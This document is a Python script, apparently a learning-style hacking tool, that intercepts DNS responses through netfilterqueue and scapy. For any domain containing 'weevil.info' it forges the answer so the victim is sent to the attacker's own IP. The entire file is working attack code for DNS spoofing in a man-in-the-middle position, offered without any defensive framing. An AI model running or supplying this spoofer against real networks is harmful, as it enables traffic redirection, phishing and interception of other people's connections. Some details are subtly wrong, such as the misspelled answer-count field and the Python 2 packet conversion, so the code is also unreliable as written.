#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import subprocess
import re

def get_ip():
    ifconfig_result = subprocess.check_output(["ifconfig"]).decode()
    current_ip = re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", ifconfig_result)
    if (not current_ip):
        print("[-] cannot read ip addr")
    else:
        return(current_ip.group(0))

get_ip = get_ip()

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        #print(scapy_packet.show())
        if "weevil.info" in qname:
            print ("[+] spoofing website")
            answere = scapy.DNSRR(rrname = qname, rdata = get_ip)
            scapy_packet[scapy.DNS].an = answere
            scapy_packet[scapy.DNS].account = 1


            #deleting values to set them to default
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

            #print(answere.show())
        #print(scapy_packet.show())

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()




